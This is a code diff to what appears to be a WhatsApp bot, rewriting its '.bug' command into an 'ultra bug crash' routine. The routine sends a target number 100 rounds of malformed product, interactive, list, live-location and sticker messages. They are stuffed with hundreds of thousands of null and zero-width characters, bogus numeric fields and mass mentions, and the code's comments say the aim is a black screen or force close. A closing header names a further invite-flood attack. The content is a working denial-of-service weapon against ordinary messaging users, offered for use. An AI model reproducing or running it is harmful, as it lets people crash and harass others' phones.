@@ -20,14 +20,15 @@ function getTarget(args, from, reply, cmdName) {
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== .bug (original product crash) ====================
+/ ==================== ULTRA BUG CRASH (100 mixed payloads – BLACK SCREEN / FORCE CLOSE) ====================
 async function ttaas(conn, target) {
+    // Base image message (extremely malformed)
     const imageMessage = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
         fileLength: "93217",
-        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
+        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
         height: 1080,
         width: 1080,
         mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
@@ -41,27 +42,93 @@ async function ttaas(conn, target) {
         scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
         midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
     };
-    const msg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                productMessage: {
-                    product: {
-                        productImage: imageMessage,
-                        productId: "449756950375071",
-                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
-                        description: "",
-                        priceAmount1000: { low: 999, high: 0, unsigned: false },
-                        url: "wa.me/status",
-                        productImageCount: 9999999,
-                        firstImageId: "9999999999",
-                        salePriceAmount1000: { low: 9999999, high: 999999999, unsigned: true }
-                    },
-                    businessOwnerJid: "13135550002@s.whatsapp.net"
+
+    // Create 100 mixed crash payloads (product + interactive + list + location + sticker)
+    for (let i = 0; i < 100; i++) {
+        // 1. Product message (original)
+        const productMsg = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    productMessage: {
+                        product: {
+                            productImage: imageMessage,
+                            productId: "449756950375071",
+                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
+                            description: "MY Bad" + "\u2060".repeat(60000),
+                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
+                            url: "wa.me/status",
+                            productImageCount: 9999999,
+                            firstImageId: "9999999999",
+                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
+                        },
+                        businessOwnerJid: "13135550002@s.whatsapp.net"
+                    }
                 }
             }
-        }
-    }, {});
-    await conn.relayMessage(target, msg.message, {});
+        }, {});
+        await conn.relayMessage(target, productMsg.message, {});
+
+        // 2. Interactive message with 1MB null bytes
+        const interactiveMsg = generateWAMessageFromContent(target, {
+            interactiveMessage: {
+                header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
+                body: { text: "\u2060".repeat(80000) },
+                footer: { text: "\u0000".repeat(90000) },
+                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
+                contextInfo: {
+                    mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
+                }
+            }
+        }, {});
+        await conn.relayMessage(target, interactiveMsg.message, {});
+
+        // 3. List message with extreme title
+        const listMsg = generateWAMessageFromContent(target, {
+            listMessage: {
+                title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(920000),
+                footerText: "SHAVIYA Bug" + "\u2060".repeat(50000),
+                description: "SHAVIYA Bug" + "\u0000".repeat(50000),
+                buttonText: null,
+                listType: 2,
+                productListInfo: {
+                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
+                    businessOwnerJid: "0@s.whatsapp.net"
+                }
+            }
+        }, {});
+        await conn.relayMessage(target, listMsg.message, {});
+
+        // 4. Live location message with malformed coordinates
+        const locationMsg = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    liveLocationMessage: {
+                        degreesLatitude: "p".repeat(50000),
+                        degreesLongitude: "p".repeat(50000),
+                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
+                        sequenceNumber: "0",
+                        jpegThumbnail: ""
+                    }
+                }
+            }
+        }, {});
+        await conn.relayMessage(target, locationMsg.message, {});
+
+        // 5. Sticker message with massive fileLength
+        const stickerMsg = generateWAMessageFromContent(target, {
+            stickerMessage: {
+                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
+                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+                mimetype: "image/webp",
+                fileLength: "9999999999999999999",
+                isAnimated: false,
+                contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
+            }
+        }, {});
+        await conn.relayMessage(target, stickerMsg.message, {});
+    }
 }
 
 // ==================== .fc-hard (30 newsletter admin invites – NO DELAYS) ====================
